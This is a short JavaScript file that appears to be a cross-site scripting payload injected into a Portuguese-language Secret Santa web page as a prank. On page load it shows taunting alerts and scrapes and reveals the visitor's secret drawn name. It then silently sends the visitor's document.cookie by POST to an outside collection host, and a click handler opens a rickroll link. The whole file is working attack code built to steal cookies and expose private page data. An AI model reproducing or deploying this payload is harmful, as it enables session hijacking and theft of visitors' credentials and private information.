function postPayload() {

  const url = "https://xss-cookie-receiver.fly.dev/rcv";

  const payload = {
    data: document.cookie,
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Response:", data);
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

function getElementByXpath(path) {
  return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}

function removeNonAlphanumeric(inputString) {
    return inputString.replace(/[^A-Z\d\s]/gi, '');
};

function getAmigoSecreto() {
   return removeNonAlphanumeric($("#xss-dos-guri")[0].innerHTML.split('amigoTireiAberto')[1].split('strong')[1])
};

function tiago() {
  alert("Trollados by rdz");
  alert("Você tirou: " + getAmigoSecreto());
  postPayload();
}


document.addEventListener('DOMContentLoaded', function () {
    tiago();
});

document.body.addEventListener('click', function () {
    window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
});

